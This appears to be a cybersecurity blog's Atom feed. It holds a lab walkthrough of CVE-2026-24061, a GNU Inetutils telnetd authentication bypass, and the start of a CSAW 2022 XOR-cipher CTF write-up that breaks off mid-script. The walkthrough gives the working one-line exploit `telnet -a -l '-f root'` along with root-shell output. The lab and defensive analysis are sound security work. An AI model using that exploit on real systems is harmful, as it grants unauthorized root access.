<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2026-01-25T22:12:22-06:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">&lt;a href=&quot;/&quot; style=&quot;text-decoration:none;color:#b5e853;&quot;&gt;ÂΩì„Å¶Ë∫´ Atemi&lt;/a&gt;</title><subtitle>A Cybersecurity blog by shinris3n &lt;br&gt; üëä &lt;a href = &quot;/writeups&quot;&gt;Writeups&lt;/a&gt; üëä &lt;a href = &quot;/news&quot;&gt;News&lt;/a&gt; üëä &lt;a href = &quot;/resources&quot;&gt;Resources&lt;/a&gt; &lt;br&gt;</subtitle><entry><title type="html">CVE-2026-24061 - Telnet RCE Vulnerability Walkthrough and Analysis</title><link href="http://0.0.0.0:4000/news/2026/01/25/CVE-2026-24061-Analysis.html" rel="alternate" type="text/html" title="CVE-2026-24061 - Telnet RCE Vulnerability Walkthrough and Analysis" /><published>2026-01-25T20:09:21-06:00</published><updated>2026-01-25T20:09:21-06:00</updated><id>http://0.0.0.0:4000/news/2026/01/25/CVE-2026-24061-Analysis</id><content type="html" xml:base="http://0.0.0.0:4000/news/2026/01/25/CVE-2026-24061-Analysis.html"><![CDATA[<h2 id="vulnerability-cve-2026-24061-gnu-inetutils-telnetd">Vulnerability: CVE-2026-24061 (GNU Inetutils <code class="language-plaintext highlighter-rouge">telnetd</code>)</h2>

<h4 id="its-been-a-few-years-since-ive-posted-anything-here-myself-or-on-behalf-of-team-ninpwn-even-though-ive-been-accruing-write-ups-for-ctfs-in-our-notes-that-never-make-it-over--figured-this-was-a-good-way-to-get-back-into-personal-community-contribution-though-outside-of-what-we-do-for-our-9-to-5s--enjoy">It‚Äôs been a few years since I‚Äôve posted anything here myself or on behalf of Team NINPWN, even though I‚Äôve been accruing write-ups for CTFs in our notes that never make it over.  Figured this was a good way to get back into personal community contribution though, outside of what we do for our 9 to 5s.  Enjoy!</h4>

<p>We spent some time this weekend exploring <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24061" target="_blank">CVE-2026-24061</a>, the new RCE in GNU Inetutils <code class="language-plaintext highlighter-rouge">telnetd</code> that allows an attacker to inject arguments into the login process via the <code class="language-plaintext highlighter-rouge">USER</code> environment variable and bypass authentication.</p>

<p>In short, <code class="language-plaintext highlighter-rouge">telnet -a -l '-f root' &lt;IP&gt;</code> will drop an attacker into root shell on all versions of this specific <code class="language-plaintext highlighter-rouge">telnetd</code> server from 2015 to present.</p>

<p>We wanted to try this out for ourselves and, since Telnet is still everywhere in OT and embedded environments, we also wanted to see if this (or a possible variant) affected other common implementations like BusyBox. We spun up a lab to verify the exploit on GNU Inetutils and checked if BusyBox <code class="language-plaintext highlighter-rouge">telnetd</code> was also vulnerable.</p>

<p>Below is our analysis along with a lab setup walkthrough for anyone who wants to experiment with this themselves.</p>

<h2 id="tldr">TLDR</h2>

<table>
  <thead>
    <tr>
      <th style="text-align: left"><strong>Implementation</strong></th>
      <th style="text-align: left"><strong>Status</strong></th>
      <th style="text-align: left"><strong>Reason</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left"><font color="red">GNU Inetutils</font></td>
      <td style="text-align: left">Confirmed as Exploitable</td>
      <td style="text-align: left">Unsafe template expansion (<code class="language-plaintext highlighter-rouge">%U</code>) of user-supplied data into the login command string.</td>
    </tr>
    <tr>
      <td style="text-align: left"><font color="sky blue">BusyBox</font></td>
      <td style="text-align: left">Not Exploitable (‚Ä¶but still just please stop using Telnet in 2026 and if you have to, restrict network access as much as possible‚Ä¶)</td>
      <td style="text-align: left">Smart (or lazy) devs never implemented the <a href="https://www.rfc-editor.org/rfc/rfc1572.html" target="_blank">RFC 1572</a> option on the server side and use hardcoded arguments (<code class="language-plaintext highlighter-rouge">argv</code>) for execution.</td>
    </tr>
  </tbody>
</table>

<h2 id="lab-setup">Lab Setup</h2>

<h3 id="step-1-environment-pre-reqs">Step 1: Environment Pre-reqs</h3>

<p>To follow along, you just need a Linux host (we used <a href="https://cdimage.debian.org/debian-cd/current/amd64/iso-cd/debian-13.3.0-amd64-netinst.iso" target="_blank">Debian 13.3</a>) with Telnet pre-installed. For Docker installation we used:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Add Docker's official GPG key:</span>
apt update <span class="o">&amp;&amp;</span> apt <span class="nb">install</span> <span class="nt">-y</span> ca-certificates curl gnupg
<span class="nb">install</span> <span class="nt">-m</span> 0755 <span class="nt">-d</span> /etc/apt/keyrings
curl <span class="nt">-fsSL</span> https://download.docker.com/linux/debian/gpg | gpg <span class="nt">--dearmor</span> <span class="nt">-o</span> /etc/apt/keyrings/docker.gpg
<span class="nb">chmod </span>a+r /etc/apt/keyrings/docker.gpg

<span class="c"># Add the repository to Apt sources:</span>
<span class="nb">echo</span> <span class="se">\</span>
  <span class="s2">"deb [arch=</span><span class="si">$(</span>dpkg <span class="nt">--print-architecture</span><span class="si">)</span><span class="s2"> signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian </span><span class="se">\</span><span class="s2">
  </span><span class="si">$(</span><span class="nb">.</span> /etc/os-release <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$VERSION_CODENAME</span><span class="s2">"</span><span class="si">)</span><span class="s2"> stable"</span> | <span class="se">\</span>
  <span class="nb">tee</span> /etc/apt/sources.list.d/docker.list <span class="o">&gt;</span> /dev/null

<span class="c"># Install Docker:</span>
apt update <span class="o">&amp;&amp;</span> apt <span class="nb">install</span> <span class="nt">-y</span> docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
</code></pre></div></div>

<h3 id="step-2-the-lab-setup">Step 2: The Lab Setup</h3>

<p>We used two containers: one running the vulnerable GNU Inetutils daemon and one running the secure BusyBox implementation.</p>

<ul>
  <li><strong>Target 1: The Vulnerable Box (GNU)</strong></li>
</ul>

<p>We deployed an older Debian container (Buster) and install <code class="language-plaintext highlighter-rouge">inetutils-telnetd</code> and purposely left <code class="language-plaintext highlighter-rouge">/etc/securetty</code> active.  Normally, this stops root from logging in on pseudo-terminals, but as you‚Äôll see, this exploit completely ignores it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">-d</span> <span class="se">\</span>
  <span class="nt">--name</span> telnet-gnu <span class="se">\</span>
  debian:buster <span class="se">\</span>
  sh <span class="nt">-c</span> <span class="s2">"echo 'deb http://archive.debian.org/debian buster main' &gt; /etc/apt/sources.list &amp;&amp; </span><span class="se">\</span><span class="s2">
  echo 'deb http://archive.debian.org/debian-security buster/updates main' &gt;&gt; /etc/apt/sources.list &amp;&amp; </span><span class="se">\</span><span class="s2">
  apt-get -o Acquire::Check-Valid-Until=false update &amp;&amp; </span><span class="se">\</span><span class="s2">
  DEBIAN_FRONTEND=noninteractive apt-get install -y inetutils-telnetd openbsd-inetd &amp;&amp; </span><span class="se">\</span><span class="s2">
  useradd -m OTmaintenance &amp;&amp; </span><span class="se">\</span><span class="s2">
  echo 'OTmaintenance:OTmaintenance123' | chpasswd &amp;&amp; </span><span class="se">\</span><span class="s2">
  echo 'root:LabRoot123' | chpasswd &amp;&amp; </span><span class="se">\</span><span class="s2">
  echo 'telnet stream tcp nowait root /usr/sbin/telnetd telnetd' &gt; /etc/inetd.conf &amp;&amp; </span><span class="se">\</span><span class="s2">
  /usr/sbin/inetd -d"</span>
</code></pre></div></div>

<p><img src="/assets/news/cve-2026-24061/docker_setup_t1.png" alt="Docker Setup Target 1" /></p>

<ul>
  <li><strong>Target 2: The Unknown Box (BusyBox)</strong></li>
</ul>

<p>We deployed Alpine Linux with <code class="language-plaintext highlighter-rouge">busybox-extras</code> to serve as our other test system. This mimics the lightweight environment found in many IoT/OT devices.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">-d</span> <span class="se">\</span>
  <span class="nt">--name</span> telnet-busybox <span class="se">\</span>
  alpine:3.22 <span class="se">\</span>
  sh <span class="nt">-c</span> <span class="s2">"apk add --no-cache busybox-extras &amp;&amp; </span><span class="se">\</span><span class="s2">
  adduser -D OTmaintenance &amp;&amp; </span><span class="se">\</span><span class="s2">
  echo 'OTmaintenance:OTmaintenance123' | chpasswd &amp;&amp; </span><span class="se">\</span><span class="s2">
  echo 'root:LabRoot123' | chpasswd &amp;&amp; </span><span class="se">\</span><span class="s2">
  telnetd -F"</span>
</code></pre></div></div>

<p><img src="/assets/news/cve-2026-24061/docker_setup_t2.png" alt="Docker Setup Target 2" /></p>

<p><img src="/assets/news/cve-2026-24061/docker_setup_2.png" alt="Running Docker Containers" /></p>

<h3 id="step-3-the-exploit-mechanism-cve-2026-24061">Step 3: The Exploit Mechanism (CVE-2026-24061)</h3>

<p>The exploit relies on two specific options in the standard <code class="language-plaintext highlighter-rouge">telnet</code> client, both of which facilitate <a href="https://www.rfc-editor.org/rfc/rfc1572.html" target="_blank">RFC 1572</a> (Telnet Environment Option), which the RFC describes as:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="s2">" ...a mechanism for passing environment
   information between a telnet client and server.  Use of this
   mechanism enables a telnet user to propagate configuration
   information to a remote host when connecting."</span>
</code></pre></div></div>

<p>Checking out <code class="language-plaintext highlighter-rouge">telnet</code> options:</p>

<p><img src="/assets/news/cve-2026-24061/telnet_help.png" alt="Telnet Help" /></p>

<p><strong>1. <code class="language-plaintext highlighter-rouge">telnet -a</code> (Automatic Login)</strong></p>

<ul>
  <li>
    <p>This option enables the client to attempt automatic login. It tells the client to send the <code class="language-plaintext highlighter-rouge">WILL NEW-ENVIRON</code> option during the initial negotiation handshake.</p>
  </li>
  <li>
    <p>If the server agrees (responds with <code class="language-plaintext highlighter-rouge">DO NEW-ENVIRON</code>), the client is then permitted to send environment variables across the wire.</p>
  </li>
</ul>

<p><strong>2. <code class="language-plaintext highlighter-rouge">telnet -l &lt;user&gt;</code> (Login Name)</strong></p>

<ul>
  <li>
    <p>When you use <code class="language-plaintext highlighter-rouge">-l</code>, the client sets the <code class="language-plaintext highlighter-rouge">USER</code> environment variable to the string you provide.</p>
  </li>
  <li>
    <p>The client does <em>not</em> validate the content of this string. It assumes you are providing a valid username (e.g., ‚Äúshinris3n‚Äù). If you provide ‚Äú<code class="language-plaintext highlighter-rouge">-f root</code>‚Äù, the client sets <code class="language-plaintext highlighter-rouge">USER="-f root"</code> and transmits it to the server.</p>
  </li>
</ul>

<p>The vulnerable code snippet in <code class="language-plaintext highlighter-rouge">GNU_Inetutils_telnetd.c</code> is:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Template command line for invoking login program.  */</span>

<span class="kt">char</span> <span class="o">*</span><span class="n">login_invocation</span> <span class="o">=</span>
<span class="cp">#ifdef SOLARIS10
</span>  <span class="cm">/* TODO: `-s telnet' or `-s ktelnet'.
   *       `-u' takes the Kerberos principal name
   *       of the authenticating, remote user.
   */</span>
  <span class="n">PATH_LOGIN</span> <span class="s">" -p -h %h %?T{-t %T} -d %L %?u{-u %u}{%U}"</span>
<span class="cp">#elif defined SOLARIS
</span>  <span class="cm">/* At least for SunOS 5.8.  */</span>
  <span class="n">PATH_LOGIN</span> <span class="s">" -h %h %?T{%T} %?u{-- %u}{%U}"</span>
<span class="cp">#else </span><span class="cm">/* !SOLARIS */</span><span class="cp">
</span>  <span class="n">PATH_LOGIN</span> <span class="s">" -p -h %h %?u{-f %u}{%U}"</span>
<span class="cp">#endif
</span>  <span class="p">;</span>

</code></pre></div></div>

<p>In the <code class="language-plaintext highlighter-rouge">!SOLARIS</code> branch, <code class="language-plaintext highlighter-rouge">%?u</code> evaluates to false because <code class="language-plaintext highlighter-rouge">%u</code> is reserved for sessions that have already authenticated via the Telnet protocol (like Kerberos). Since we are coming in unauthenticated, this is null and the <code class="language-plaintext highlighter-rouge">%U</code> path applies, then pulls what we supply via <code class="language-plaintext highlighter-rouge">-l</code>  and expands it directly into the command string without sanitization.</p>

<p>In the context of the <code class="language-plaintext highlighter-rouge">login</code> binary:</p>

<p><img src="/assets/news/cve-2026-24061/login_help.png" alt="Login Help" /></p>

<p><u><b>Intended Behavior:</b></u> If we provide a standard username (e.g., <code class="language-plaintext highlighter-rouge">OTmaintenance</code>), the daemon constructs a command like this: <code class="language-plaintext highlighter-rouge">login -p -h &lt;host&gt; OTmaintenance</code> and the system just prompts for a password.</p>

<p><u><b>Exploited Behavior:</b></u> By using the telnet <code class="language-plaintext highlighter-rouge">-l</code> option to inject flags into the username variable (e.g., <code class="language-plaintext highlighter-rouge">-f root</code>), the template expands to: <code class="language-plaintext highlighter-rouge">login -p -h &lt;host&gt; -f root</code> and the shell sees <code class="language-plaintext highlighter-rouge">-f</code> (force) as a flag for <code class="language-plaintext highlighter-rouge">login</code> rather than part of the username. This tells <code class="language-plaintext highlighter-rouge">login</code> that the user is already authenticated.</p>

<h3 id="step-4-execution-and-verification">Step 4: Execution and Verification</h3>

<p>First, grab the IP addresses:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker inspect <span class="nt">-f</span> <span class="s1">' - '</span> telnet-busybox telnet-gnu
</code></pre></div></div>

<p>Next, we execute the attack using the standard telnet client. The <code class="language-plaintext highlighter-rouge">-a</code> flag attempts automatic login and <code class="language-plaintext highlighter-rouge">-l</code> lets us specify our malicious user variable.</p>

<p><strong>Super Complex Exploit String:</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet <span class="nt">-a</span> <span class="nt">-l</span> <span class="s1">'-f root'</span> &lt;TARGET_IP&gt;
</code></pre></div></div>

<ul>
  <li>
    <h3 id="gnu-inetutils-vulnerable">GNU Inetutils (Vulnerable)</h3>
  </li>
</ul>

<p>When targeting the GNU container, you should see immediate root access:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Trying 172.17.0.2...
Connected to 172.17.0.2.
Escape character is '^]'.
root@943b8243d87c:~# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div></div>

<p><strong>Bypassing /etc/securetty</strong></p>

<p>We really wanted to highlight this part. Typically, Linux systems use <code class="language-plaintext highlighter-rouge">/etc/securetty</code> to prevent root logins on pseudo-terminals (<code class="language-plaintext highlighter-rouge">pts/0</code>).</p>

<p><strong>This configuration is ignored.</strong></p>

<p>Because the <code class="language-plaintext highlighter-rouge">-f</code> flag tells the <code class="language-plaintext highlighter-rouge">login</code> binary that the user is <em>already authenticated</em>, the entire authentication phase is skipped. This means <code class="language-plaintext highlighter-rouge">login</code> never checks <code class="language-plaintext highlighter-rouge">/etc/securetty</code> or prompts for a password. No configuration change to <code class="language-plaintext highlighter-rouge">login</code> or <code class="language-plaintext highlighter-rouge">securetty</code> will stop this; you have to patch the server code.</p>

<p>In action:</p>

<p><img src="/assets/news/cve-2026-24061/GNU.png" alt="GNU Attack" /></p>

<ul>
  <li>
    <h3 id="busybox-not-exploitable">BusyBox (Not Exploitable)</h3>
  </li>
</ul>

<p>When targeting the BusyBox container, the exploit fails:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Trying 172.17.0.3...
Connected to 172.17.0.3.
Escape character is '^]'.
login: root
Login incorrect
</code></pre></div></div>

<p>In action:</p>

<p><img src="/assets/news/cve-2026-24061/BusyBox.png" alt="BusyBox Attack" /></p>

<h3 id="step-5-code-analysis-why-the-exploit-doesnt-work-on-busyboxs-implementation">Step 5: Code Analysis (Why the Exploit Doesn‚Äôt Work on BusyBox‚Äôs Implementation)</h3>

<p>A look at the source code for BusyBox <code class="language-plaintext highlighter-rouge">telnetd</code> (<code class="language-plaintext highlighter-rouge">busybox_telnetd.c</code>) shows why it is immune. Instead of using string templates to build the command, it manually constructs the argument array (<code class="language-plaintext highlighter-rouge">argv</code>) in C:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* busybox_telnetd.c */</span>
<span class="n">login_argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">G</span><span class="p">.</span><span class="n">loginpath</span><span class="p">;</span> <span class="c1">// Resolves to /bin/login</span>
<span class="n">login_argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>        <span class="c1">// Explicit terminator</span>
<span class="n">BB_EXECVP</span><span class="p">(</span><span class="n">G</span><span class="p">.</span><span class="n">loginpath</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="n">login_argv</span><span class="p">);</span>
</code></pre></div></div>

<p>By explicitly terminating the argument list at index 1, BusyBox ensures that no user-supplied data can be interpreted as a command-line flag.</p>

<p>Not that this matters, because (even though their Telnet client supports it) BusyBox doesn‚Äôt even implement the <code class="language-plaintext highlighter-rouge">NEW-ENVIRON</code> option required to pass environment variables (like our malicious <code class="language-plaintext highlighter-rouge">USER</code> variable) in the first place. It explicitly handles <code class="language-plaintext highlighter-rouge">TELOPT_NAWS</code> (Window Size) but falls through for everything else, implicitly dropping our payload:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* busybox_telnetd.c */</span>
<span class="k">if</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">SB</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="n">TELOPT_NAWS</span><span class="p">)</span> <span class="p">{</span>
        <span class="cm">/* ... Logic to handle Window Size (NAWS) ... */</span>
        <span class="cm">/* ... */</span>
        <span class="k">goto</span> <span class="n">update_and_return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="cm">/* else: other subnegs not supported yet */</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="cleanup">Cleanup</h3>

<p>Once you are done testing, you can stop and remove the containers with:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker <span class="nb">rm</span> <span class="nt">-f</span> telnet-busybox telnet-gnu
</code></pre></div></div>

<h3 id="conclusion">Conclusion</h3>

<p>From the coding perspective, this is a great example of why using string expansion for system calls is a bad idea, and in this case it allows for trivial takeover of affected systems. You can add this to the long list of reasons to stop using (or at least further restrict access to) Telnet in your environment. Since the exploit skips the authentication check entirely, standard hardening like <code class="language-plaintext highlighter-rouge">securetty</code> doesn‚Äôt help. The only real fix is patching.  It‚Äôs absolutely wild that this has gone undiscovered for 10+ years.</p>]]></content><author><name>shinris3n</name></author><category term="[&quot;news&quot;]" /><category term="Telnet" /><category term="RCE" /><category term="CVE-2026-24061" /><summary type="html"><![CDATA[Vulnerability: CVE-2026-24061 (GNU Inetutils telnetd)]]></summary></entry><entry><title type="html">Gotta Crack Them All</title><link href="http://0.0.0.0:4000/writeups/2022/09/11/CSAW2022-GCTA.html" rel="alternate" type="text/html" title="Gotta Crack Them All" /><published>2022-09-11T17:11:21-05:00</published><updated>2022-09-11T17:11:21-05:00</updated><id>http://0.0.0.0:4000/writeups/2022/09/11/CSAW2022-GCTA</id><content type="html" xml:base="http://0.0.0.0:4000/writeups/2022/09/11/CSAW2022-GCTA.html"><![CDATA[<h1></h1>
<h3><font color="FF3030"> Challenge Text: </font></h3>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">As an intern in the security department, you want to show the admin what a major security issue there is by having all passwords being from a wordlist (even if it is one the admin created) as well as potential issues with stream ciphers. 
Here's the list of encrypted passwords (including the admin's), the encryption algorithm and your password. Can you crack them all and get the admin's password?
Here is the web service that the admin made to encrypt a password: nc crypto.chal.csaw.io 5002

NOTE: The flag is just the admin's password.
</span></code></pre></div></div>
<h3><font color="FF3030"> Solution: </font></h3>

<ul>
  <li>We‚Äôre provided with three files to inspect.  Inside of <code class="language-plaintext highlighter-rouge">encrypt.py</code>, we see that <code class="language-plaintext highlighter-rouge">encrypt(plain)</code> takes a plaintext string and XORs it with a key:</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'key.txt'</span><span class="p">,</span><span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
  <span class="n">key</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">plain</span><span class="p">):</span>
  <span class="k">return</span> <span class="sa">b</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">((</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">^</span> <span class="n">y</span><span class="p">).</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">'big'</span><span class="p">)</span> <span class="k">for</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">plain</span><span class="p">,</span><span class="n">key</span><span class="p">))</span>
</code></pre></div></div>

<ul>
  <li>Inside of <code class="language-plaintext highlighter-rouge">leaked_password.txt</code> we have:
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cacturne-Grass-Dark
</code></pre></div>    </div>
  </li>
  <li>Inside of <code class="language-plaintext highlighter-rouge">encrypted_passwords.txt</code> we find what looks like individually encrypted passwords separated by new lines:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚îå‚îÄ‚îÄ<span class="o">(</span>shinris3n„âøkodachi<span class="o">)</span>-[~/sec/CTFs/CSAW2022]
‚îî‚îÄ<span class="nv">$ </span>python3                                                                                                 
Python 3.9.13 <span class="o">(</span>main, Jun  8 2022, 09:45:57<span class="o">)</span> 
<span class="o">[</span>GCC 11.3.0] on linux
Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
<span class="o">&gt;&gt;&gt;</span> with open<span class="o">(</span><span class="s1">'encrypted_passwords.txt'</span>,<span class="s1">'rb'</span><span class="o">)</span> as f:
...     passwords <span class="o">=</span> f.read<span class="o">()</span>
... 
<span class="o">&gt;&gt;&gt;</span> print<span class="o">(</span>passwords<span class="o">)</span>
b<span class="s1">'cr\xcb\xaa\xc0Si\x83\xf0\xb8\xe6\x99\xbf\nlz\xd7\xa6\xdeWr\x83\xe3\xb8\xe0\x97\nks\xcc\xa3\xcbZr\xc0\xc0\xf4\xc2\x8f\xb4\x7f\xab.\xcd\n`z\xd5\xbd\xc5Xb\x83\xe9\xb6\xe0\x91\xacp\nkw\xc4\xba\xc5Ba\xcb\xd5\xf4\xc5\x9d\xb9y\xb1\nkz\xc6\xb9\xd9Du\xcb\x8a\x9e\xe0\x9d\xbeo\xee\x03\xcf\xddd\n{w\xca\xba\xc7_u\xc9\x8a\x89\xfd\x95\xbes\xadj\xfe\xdcv\xf6\xe4\xd2\xaa\n{u\xc0\xac\xdfSw\x83\xe3\xb8\xe0\x97\xe0U\xa0"\n`t\xca\xbd\xcd\x1bK\xdd\xde\xba\xfa\x95\xae1\x84/\xc1\xdc{\nzs\xdc\xbd\xc9Dr\xc1\xd5\xf4\xd5\x8e\xa2i\xad#\x83\xfd`\xf6\xe7\n{~\xc0\xa9\xc3B6\xe9\xd5\xb8\xe1\x8f\nks\xcc\xa3\xcf^t\xdb\x8a\x8e\xf3\x88\xa8n\xee\x02\xc2\xcal\xe1\xfe\xd2\xaa\n|h\xc4\xbf\xc9Su\xcf\x8a\x9e\xe0\x9d\xbeo\nmc\xc6\xac\xc8Dr\xc2\xcb\xf4\xd5\x8e\xa2i\xad#\x83\xfc{\xf0\xe9\xd7\non\xc8\xbe\xc4Yt\xdd\x8a\x97\xfd\x8e\xa0}\xaf\nci\xcc\xae\xc7So\xdb\xc9\xbc\xbf\xbe\xb8{\nlz\xd7\xb9\xde_c\x83\xe0\xab\xf3\x8f\xbe1\x85+\xd7\xc6a\xf2\nxr\xce\xa4\xdcSp\x83\xe9\xb6\xe0\x91\xacp\xee\x01\xc2\xd6f\xfb\xeb\nln\xc2\xb9\xde_t\x83\xe0\xab\xfd\x89\xa3x\xee\x14\xda\xcaj\xf9\njz\xd6\xae\xd9Zr\xc0\x8a\x8e\xf3\x88\xa8n\n`r\xd5\xbd\xc3A\x7f\xc1\xc9\xf4\xd5\x8e\xa2i\xad#\n|t\xc2\xa8\xd8_x\x83\xe1\xb8\xfb\x8e\xb41\x85+\xd7\xc6a\xf2\nnr\xcb\xa3\xc9Yu\x83\xf0\xb8\xe6\x99\xbf\nzr\xca\xa1\xd9\x1b]\xc7\xc0\xb1\xe6\x95\xa3{\nmu\xd1\xa8\xc5\x1b]\xc7\xd5\xbc\n{k\xd7\xa4\xd8L~\xcb\x8a\x9f\xf3\x95\xbfe\nez\xcb\xb9\xc5X~\x83\xf0\xb8\xe6\x99\xbf1\x85+\xd7\xc6a\xf2\n{r\xc9\xbb\xcdZw\xd7\x8a\x97\xfd\x8e\xa0}\xaf\nj~\xc9\xa1\xdfFi\xc1\xd2\xad\xbf\xbb\xbf}\xb04\x83\xff`\xfc\xff\xd4\xa7\n\x7fb\xd7\xa9\xc9Si\x83\xe9\xb6\xe0\x91\xacp\xee\x17\xdd\xd6l\xfd\xe5\xd8\nez\xd7\xa4\xc0Z6\xf9\xc6\xad\xf7\x8e\xe0Z\xa2.\xdc\xd6\n`~\xd7\xa9\xc5Si\x83\xe9\xb6\xe0\x91\xacp\niw\xd1\xac\xde_z\x83\xe3\xab\xf3\x9b\xa2r\xee\x01\xc2\xd6f\xfb\xeb\n|s\xd2\xac\xcf]~\xd7\x8a\x9e\xe0\x9d\xbeo\n{k\xc0\xba\xdcW6\xec\xd2\xbe\nji\xca\xa3\xd6Yu\xc9\x8a\x8a\xe6\x99\xa8p\xee\x17\xdd\xd6l\xfd\xe5\xd8\n`z\xce\xac\xc1Y6\xc1\x8a\x9d\xe0\x9d\xaas\xadj\xe8\xc6h\xfd\xf8\xd2\xa7\x9c\nks\xc0\xbe\xdc_u\x83\xe0\xab\xf3\x8f\xbe\nei\x8b\xed\xe1_v\xcb\x8a\x89\xe1\x85\xaet\xaa$\x83\xe9n\xfc\xfe\xc2\n|t\xd7\xa3\xcdRn\xdd\x8a\x9f\xfe\x85\xa4r\xa4\nxn\xd5\xa4\xd8Wi\x83\xf5\xb6\xf1\x97\xe0[\xb1(\xdb\xc1k\nkt\xc8\xaf\xd9Ep\xcb\xc9\xf4\xd4\x95\xbfy\xee\x01\xc7\xc8g\xe1\xe5\xd5\xae\non\xdf\xb7\xc0Yi\xca\x8a\x9d\xf3\x8e\xa61\x875\xcf\xc8`\xfb\nkz\xd7\xa3\xc5@r\xc0\xc2\xf4\xd5\x8e\xaco\xb0\noi\xca\xba\xc0_o\xc6\xc2\xf4\xd4\x95\xbfy\noi\xd0\xaf\xce_u\x83\xe5\xac\xf5\noz\xd6\xb9\xdeY\x7f\xc1\xc9\xf4\xc5\x9d\xb9y\xb1j\xe9\xdd`\xe0\xe2\xdf\not\xca\xa0\xd5\x1b_\xdc\xc6\xbe\xfd\x92\n|s\xcc\xa8\xdaCw\x83\xe3\xb8\xe0\x97\n\x19u\x90\xfe\xcfC)\x9d\x92\xee\xa0\xcf\xf9q\xa0v\xde\xc7&lt;\xa7\n{~\xc4\xa9\xdeW6\xf9\xc6\xad\xf7\x8e\n'</span>
</code></pre></div></div>

<ul>
  <li>Interacting with the server, we see that we may only pass across certain plaintext strings for encryption.  The leaked password works as one of the allowed strings:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚îå‚îÄ‚îÄ<span class="o">(</span>shinris3n„âøkodachi<span class="o">)</span>-[~]
‚îî‚îÄ<span class="nv">$ </span>nc crypto.chal.csaw.io 5002                                                                             
You can encrypt a pre-approved password using this service.

What is the password you would like to encrypt?

<span class="o">&gt;&gt;</span> 0
This is not a pre-approved password! <span class="o">&gt;</span>:<span class="o">(</span>
It will not be encrypted.


‚îå‚îÄ‚îÄ<span class="o">(</span>shinris3n„âøkodachi<span class="o">)</span>-[~]
‚îî‚îÄ<span class="nv">$ </span>nc crypto.chal.csaw.io 5002                                                                             
You can encrypt a pre-approved password using this service.

What is the password you would like to encrypt?

<span class="o">&gt;&gt;</span> Cacturne-Grass-Dark   
The encrypted password is: b<span class="s1">'kz\xc6\xb9\xd9Du\xcb\x8a\x9e\xe0\x9d\xbeo\xee\x03\xcf\xddd'</span>
Would you like to go again? <span class="o">(</span>Y/N<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>With this information, we can try to find the key by verifying that one of the values in our encrypted passwords list matches what we received from the server (i.e. the same key was used to encrypt the passwords in this file).  We then XOR the encrypted value with the leaked plaintext password, recovering the key.  We can XOR this result with the entire list of encrypted passwords and inspect what we receive back to check if the key works for the other passwords as well:</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">known_encrypted_pws</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">leaked_pw</span> <span class="o">=</span> <span class="s">"Cacturne-Grass-Dark"</span>
